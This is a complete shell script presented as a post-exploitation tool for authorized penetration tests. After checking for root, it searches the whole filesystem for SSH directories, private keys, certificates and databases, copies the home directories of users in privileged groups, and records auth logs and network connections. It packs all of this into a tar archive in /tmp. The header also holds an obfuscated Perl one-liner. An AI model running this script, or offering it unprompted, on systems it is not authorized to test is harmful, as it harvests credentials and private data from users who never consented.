# Ransack Post Exploitation Tool v 0.1

# Ransack's sole purpose is to grab any information deemed
# relevant following a root compromise during an authorized
# penetration test. This information may include config
# files, ssh keys, ssl keys, or any other information
# deemed valuable.

# The goal is to minimize the amount of time spent digging
# through a machine in search of specifics. Instead,
# ransack will look for any data that stores configuration
# information (which may at times contain usernames and
# passwords), connection based information (including who
# is connected to what, what processes are listening and
# so forth), usernames and groups.

# It is written specifically as a shell script to avoid
# relying on another programming language that may not at
# times be available on another system. Rather than having
# to install python, perl, ruby, etc., it relies on tools
# that are always on most modern and legacy Unix variants.
# It will also parse out who may be what is considered at
# high value target: Someone in a specific group (wheel,
# root, etc) and copy over their information as well.

# This tool is for post exploitation penetration testing
# it is not meant to be used for nefarious purposes and
# was never meant to be. It is simply a tool to make
# gathering information simpler while performing
# AUTHORIZED penetration tests.

# If you have to ask: "How does it work?!?", "How can I
# get r00t?!?", or some other question along these lines
# there is a 99.99999% chance that there is an ID 10 T
# error on the machine you're using. You will need to
# fix that issue before proceeding.

# Sloppy - sure, but effective, reliable and quick
# Tested on various versions of FreeBSD, OpenBSD, Debian,
# CentOS, Ubuntu, etc.

# On FreeBSD/AMD Athlon(tm) 64 X2 Dual Core Processor
# 4400+ with 2TB, I was able to get all that I needed in
# under 6 minutes. YMMV

# On Linux
# $ awk '/model name|MHz/' /proc/cpuinfo
# model name      : AMD Phenom(tm) 9850 Quad-Core Processor
# cpu MHz         : 2511.730
#
# 1 TB took 8 minutes

#
# ''=~('(?{'.('._).^~'^'^-@@*^').'"'.(']),^'^'.@@|').',$/})')
# 

if [ "$(id -u)" != "0" ]; then

   clear ; printf "apropos RTFM\n" 1>&2
   exit 1

fi

if [ -d "/tmp/0xdeadbeef" ]

  then
  
     rm -rf /tmp/0xdeadbeef

fi

dir=/tmp/0xdeadbeef/

echo "Making directories"

mkdir $dir
cd $dir
mkdir sshkeys certificates databases configurations

# Not using xrags piped from find to avoid errors with
# trailing lines

find / -name .ssh > $dir/sshkeys/sshkeys
find / | awk '/\.crt|\.pem|\.key|\.cert/' > $dir/certificates/certs
find / | awk '/\.db|\.sql|\.sqlite/ && !/\/ports\/|msf/' > $dir/databases/db

echo "Getting user information..."
last | awk '{print $1,$3}'|sort -u > $dir/user.data.ransack

clear ; echo "Finding what's opened connection wise"

lsof | grep -i listen | awk '{print $1"\t"$3"\t"$9}'|\
sort -u > $dir/listening.data.ransack

clear
echo "Finding out who owns processes and what groups can modify those processes"

which `lsof | grep -i listen | awk '{print $1"\t"$3"\t"$9}' |\
sort -u` | xargs ls -lth > $dir/owners.data.ransack

clear
echo "Finding interesting groups"

awk -F ":" '$3 <= 1000 {print}' /etc/group |\
grep -vi "#" > $dir/groups.data.ransack

clear
echo "Finding high value targets and ransacking them"

awk -F ":" '{print $1}' $dir/groups.data.ransack | while read group
do ls -ltha /home/| grep $group |\
   awk '{print "cp -Rf /home/"$9" /tmp/0xdeadbeef/"}'|\
   grep -v "e/\." | sh
done


clear
echo "Finding established sessions (network recon)"
netstat -a | awk '/LIST|EST|CLO/' | sort -u > $dir/connexion.data.ransack

clear

if [ -e /var/log/secure ]
then
   awk '/ccept/{print $9,$11}' /var/log/secure|sort -u > $dir/connexion.data.ransack
else
   if [ -e /var/log/auth.log ]
   then
      awk '/ccept/{print $9,$11}' /var/log/auth.log | sort -u > $dir/connexion.data.ransack
   fi
fi

for i in `cat $dir/sshkeys/sshkeys`
do
   cp -Rf "$i" $dir/sshkeys/
done


for j in `cat $dir/certificates/certs`
do
   cp -Rf "$j" $dir/certificates/
done

for k in `cat $dir/databases/db`
do
   cp -Rf "$k" $dir/databases/
done

tar -cf /tmp/ransack.tar $dir/*
clear
echo "Ransacking done" ; ls -ltha /tmp/ransack.tar

rm -rf $dir
